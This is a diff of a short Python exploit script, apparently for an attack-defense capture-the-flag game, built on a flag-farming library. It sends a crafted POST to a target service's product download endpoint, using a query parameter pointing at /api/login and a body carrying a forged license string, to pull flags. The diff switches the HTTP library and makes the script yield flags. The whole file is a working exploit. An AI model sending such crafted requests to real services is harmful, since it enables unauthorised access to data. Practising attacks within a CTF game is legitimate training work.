@@ -1,18 +1,19 @@
-from requests import post
-from pyfarmer import farm, get_ids, print_exception, submit_flag
+from httpx import post
+from pyfarmer import farm, print_exception
 
 
-def main(ip: str) -> None:
-    for flag_id in get_ids("http://10.10.0.1:8081/flagIds", "Trademark"):
+def main(ip: str):
+    for flag_id in ["a", "b", "c"]:
         try:
             r = post(
                 f"http://{ip}:5000/api/products/{flag_id}/download?b=/api/login",
-                data="Type+license%28%29+to+see+the+full+license+text=license%3DAAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA",
+                content="Type+license%28%29+to+see+the+full+license+text=license%3DAAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA",
             )
-            submit_flag(r.text)
+            flag = r.text
+            yield flag
         except:
             print_exception()
 
 
 if __name__ == "__main__":
-    farm(main, __file__)
+    farm(main)
